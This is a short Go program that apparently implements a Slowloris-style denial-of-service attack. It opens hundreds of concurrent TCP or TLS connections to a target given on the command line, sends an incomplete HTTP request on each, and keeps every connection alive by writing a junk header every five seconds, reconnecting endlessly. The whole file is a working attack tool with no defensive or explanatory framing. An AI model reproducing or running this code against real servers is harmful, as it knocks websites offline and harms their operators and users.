package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"net"
	"regexp"
	"time"

	"github.com/nuuls/log"
)

var re = regexp.MustCompile(`(?:http(?:s))?([\w\-\.]+\.\w+)(?:[\/$])?`)

func main() {
	log.AddLogger(log.DefaultLogger)
	url := flag.String("url", "example.com", "target url")
	port := flag.Int("port", 443, "port")
	https := flag.Bool("https", true, "using https")
	threads := flag.Int("threads", 500, "concurrent connections")
	flag.Parse()
	u := *url
	if m := re.FindStringSubmatch(*url); len(m) > 1 {
		u = m[1]
	}
	for i := 0; i < *threads; i++ {
		go openConn(u, *port, *https)
	}
	<-make(chan struct{})
}

func openConn(addr string, port int, https bool) {
	defer openConn(addr, port, https)
	url := fmt.Sprintf("%s:%d", addr, port)
	log.Info("opening connection to", url)
	var conn net.Conn
	var err error
	if https {
		conn, err = tls.Dial("tcp", url, nil)
	} else {
		conn, err = net.Dial("tcp", url)
	}
	if err != nil {
		log.Error(err)
		return
	}
	_, err = conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + addr + "\r\n"))
	if err != nil {
		log.Error(err)
		return
	}
	for {
		_, err = conn.Write([]byte("Xd: Kappa\r\n"))
		if err != nil {
			log.Error(err)
			return
		}
		time.Sleep(time.Second * 5)
	}
}
